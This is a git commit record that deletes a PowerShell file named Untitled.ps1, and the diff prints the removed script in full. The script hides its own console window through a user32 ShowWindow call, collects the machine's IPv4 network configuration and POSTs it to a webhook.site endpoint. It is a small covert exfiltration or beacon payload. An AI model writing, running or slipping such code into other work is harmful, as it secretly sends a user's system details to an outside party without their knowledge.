b7fc89807160bb26e6a4e201305209bf55d6af0f
eooj <99329263+eooj@users.noreply.github.com>
2022-09-02 10:34:03 +0100

    Delete Untitled.ps1

--- Untitled.ps1
+++
@@ -1,7 +0,0 @@
-﻿$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-
-$string = get-netipaddress -addressfamily ipv4 | out-string
-invoke-webrequest -Uri https://webhook.site/d8e24cd1-bcf8-4e9a-88c5-734ccf47ea26 -Method POST -Body $string
-exit
